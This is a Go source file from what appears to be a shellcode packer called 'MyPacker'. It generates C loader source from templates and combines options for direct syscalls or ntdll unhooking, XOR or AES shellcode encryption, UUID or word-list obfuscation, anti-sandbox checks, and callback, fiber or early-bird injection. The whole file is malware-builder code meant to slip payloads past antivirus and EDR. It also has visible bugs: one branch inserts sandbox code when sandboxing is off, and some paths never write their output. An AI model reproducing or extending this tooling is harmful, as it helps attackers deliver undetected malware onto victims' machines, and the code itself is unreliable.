package Loader

import (
	"MyPacker/Converters"
	"MyPacker/Others"
	"fmt"
	"strconv"
	"strings"
)

func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcode string, key string, iv string, uuidString string, words string, datasetString string) string {
	fmt.Println("正在为您生成模板文件: " + options.OutFile + "." + strings.ToLower(options.Language) + "\n")
	outfile := options.OutFile
	EncryptShellcode = Converters.FormattedHexShellcode(string(EncryptShellcode))
	switch options.Unhook {
	case false:
		switch strings.ToLower(strconv.Itoa(options.Framework)) {
		case "32":
			switch strings.ToLower(options.Language) {
			case "c":
				outfile = outfile + ".c"
				switch options.Sandbox {
				case true:
					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
				default:
					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", "")
					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", "")
				}
				switch strings.ToLower(options.Encryption) {
				case "xor":
					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACR_OBFUSCATION", __c__uuid)
						__c__syscall__xor = fmt.Sprintf(__c__syscall__xor, uuidString, key)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
					case "words":
						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACR_OBFUSCATION", __c__words)
						__c__syscall__xor = fmt.Sprintf(__c__syscall__xor, datasetString, words, key)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
						//写文件
						Others.SaveTamplate2File(outfile, __c__syscall__xor)
					}
				case "aes":
					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACR_OBFUSCATION", __c__uuid)
						__c__syscall__aes = fmt.Sprintf(__c__syscall__aes, uuidString, key, iv)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
						//写文件
						Others.SaveTamplate2File(outfile, __c__syscall__aes)
					case "words":
						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACR_OBFUSCATION", __c__words)
						__c__syscall__aes = fmt.Sprintf(__c__syscall__aes, datasetString, words, key, iv)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
						//写文件
						Others.SaveTamplate2File(outfile, __c__syscall__aes)
					}
				}
			}
		case "64":
			switch strings.ToLower(options.Language) {
			case "c":
				outfile = outfile + ".c"
				switch options.Sandbox {
				case true:
					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)

				default:
					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", "")
					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)

				}
				switch strings.ToLower(options.Encryption) {
				case "xor":
					__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACR_OBFUSCATION", __c__uuid)
						__c__syscall__xor = fmt.Sprintf(__c__syscall__xor, uuidString, key)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
					case "words":
						__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACR_OBFUSCATION", __c__words)
						__c__syscall__xor = fmt.Sprintf(__c__syscall__xor, datasetString, words, key)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
						//写文件
						Others.SaveTamplate2File(outfile, __c__syscall__xor)
					}
				case "aes":
					__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
					switch strings.ToLower(options.Obfuscation) {
					case "uuid":
						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACR_OBFUSCATION", __c__uuid)
						__c__syscall__aes = fmt.Sprintf(__c__syscall__aes, uuidString, key, iv)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
						//写文件
						Others.SaveTamplate2File(outfile, __c__syscall__aes)
					case "words":
						__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACR_OBFUSCATION", __c__words)
						__c__syscall__aes = fmt.Sprintf(__c__syscall__aes, datasetString, words, key, iv)
						switch strings.ToLower(options.Loading) {
						case "callback":
							//生成模板
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall_callback)
						case "fiber":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__fiber)
						case "earlybird":
							__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
						}
						//写文件
						Others.SaveTamplate2File(outfile, __c__syscall__aes)
					}
				}
			}
		}
	case true:
		switch strings.ToLower(options.Language) {
		case "c":
			outfile = outfile + ".c"
			switch options.Sandbox {
			case true:
				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", __c__sandbox)
				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", __c__sandbox)
			default:
				__c__syscall__xor = strings.ReplaceAll(__c__syscall__xor, "REPLACE_ANTI_SANDBOX", "")
				__c__syscall__aes = strings.ReplaceAll(__c__syscall__aes, "REPLACE_ANTI_SANDBOX", "")
			}

			switch strings.ToLower(options.Encryption) {
			case "xor":
				switch strings.ToLower(options.Obfuscation) {
				case "uuid":
					__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACR_OBFUSCATION", __c__uuid)
					__c__unhook__xor = fmt.Sprintf(__c__unhook__xor, uuidString, key)
					switch strings.ToLower(options.Loading) {
					case "callback":
						//生成模板
						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook_callback)

					case "fiber":
						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__fiber)
					case "earlybird":
						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
					}
					//写文件
					Others.SaveTamplate2File(outfile, __c__unhook__xor)
				case "words":
					__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACR_OBFUSCATION", __c__words)
					__c__unhook__xor = fmt.Sprintf(__c__unhook__xor, datasetString, words, key)
					switch strings.ToLower(options.Loading) {
					case "callback":
						//生成模板
						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook_callback)
					case "fiber":
						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__fiber)
					case "earlybird":
						__c__unhook__xor = strings.ReplaceAll(__c__unhook__xor, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
					}
					//写文件
					Others.SaveTamplate2File(outfile, __c__unhook__xor)
				}
			case "aes":
				switch strings.ToLower(options.Obfuscation) {
				case "uuid":
					__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACR_OBFUSCATION", __c__uuid)
					__c__unhook__aes = fmt.Sprintf(__c__unhook__aes, uuidString, key, iv)
					switch strings.ToLower(options.Loading) {
					case "callback":
						//生成模板
						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook_callback)
					case "fiber":
						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__fiber)
					case "earlybird":
						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
					}
					//写文件
					Others.SaveTamplate2File(outfile, __c__unhook__aes)
				case "words":
					__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACR_OBFUSCATION", __c__words)
					__c__unhook__aes = fmt.Sprintf(__c__unhook__aes, datasetString, words, key, iv)
					switch strings.ToLower(options.Loading) {
					case "callback":
						//生成模板
						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook_callback)
					case "fiber":
						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__fiber)
					case "earlybird":
						__c__unhook__aes = strings.ReplaceAll(__c__unhook__aes, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
					}
					//写文件
					Others.SaveTamplate2File(outfile, __c__unhook__aes)
				}

			}

		}
	}
	return outfile
}
